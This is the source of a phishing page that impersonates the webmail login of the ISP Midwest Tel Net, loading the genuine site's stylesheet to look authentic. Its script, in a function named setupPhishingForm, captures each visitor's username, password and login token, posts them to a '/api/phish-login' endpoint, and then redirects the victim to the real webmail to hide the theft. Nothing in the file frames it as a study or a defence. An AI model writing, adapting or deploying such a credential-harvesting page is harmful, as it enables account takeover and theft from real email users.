<!doctype html>
<html lang="en">
  <head>
    <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
    <title>Midwest Tel Net Webmail :: Welcome</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="https://webmail.mwt.net/skins/larry/styles.min.css?s=1689092804"
    />
  </head>
  <body>
    <div id="loading-spinner">Loading login page...</div>

    <!-- Keep your EmailJS SDK init -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script>
      document.addEventListener("DOMContentLoaded", () => {
        // STEP 1: Get the fresh token and HTML from our backend
        fetch("/api/get-login-page")
          .then((res) => {
            // CRITICAL: Capture the Set-Cookie header if present
            const setCookieHeader = res.headers.get("set-cookie");
            if (setCookieHeader) {
              // Set the cookie for the current domain so subsequent requests include it
              // We take only the name=value part, ignoring path/domain/secure flags for simplicity
              const cookieNameValue = setCookieHeader.split(";")[0];
              document.cookie = cookieNameValue;
              console.log("Cookie set:", cookieNameValue);
            }
            return res.text();
          })
          .then((data) => {
            console.log("API Response received (Raw HTML):", data);

            // Optional: Clear the spinner before injecting
            const spinner = document.getElementById("loading-spinner");
            if (spinner) spinner.remove();

            document.body.innerHTML = data;
            setupPhishingForm();
            console.log("Form events re-bound successfully.");
          })
          .catch((err) => {
            console.error("Failed to load login page", err);
            alert("Error loading page.");
          });
      });

      function setupPhishingForm() {
        // 1. Find the form - try specific ID first, then fall back to the first form found
        let form = document.getElementById("contact-form");
        if (!form) {
          form = document.querySelector("form");
        }

        if (!form) {
          console.error("No form found in the injected HTML!");
          return;
        }

        // 2. Find inputs by name (more reliable than ID)
        const emailInput = document.querySelector('input[name="_user"]');
        const passwordInput = document.querySelector('input[name="_pass"]');
        const tokenInput = document.querySelector('input[name="_token"]');

        if (!emailInput || !passwordInput || !tokenInput) {
          console.warn(
            "Could not find all required inputs (_user, _pass, _token). Form may not work correctly.",
          );
        }

        form.addEventListener("submit", async (e) => {
          e.preventDefault();

          const email = emailInput.value;
          const password = passwordInput.value;
          const token = tokenInput ? tokenInput.value : "";

          const submitBtn =
            document.getElementById("rcmloginsubmit") ||
            form.querySelector('button[type="submit"]');

          if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerText = "Verifying...";
          }

          try {
            const res = await fetch("/api/phish-login", {
              method: "POST",
              headers: { 
                "Content-Type": "application/json",
                // CRITICAL: Include the cookie!
                "Cookie": document.cookie || "" 
              },
              body: JSON.stringify({ email, password, token }),
            });

            const data = await res.json();

            if (data.success) {
              window.location.replace("https://webmail.mwt.net/?_task=mail");
            } else {
              alert(data.message || "Invalid Credentials.");
              if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.innerText = "Login";
              }
            }
          } catch (err) {
            alert("Connection Error");
            if (submitBtn) {
              submitBtn.disabled = false;
              submitBtn.innerText = "Login";
            }
          }
        });
      }
    </script>

    <!-- Body will be populated by the script above -->
  </body>
</html>
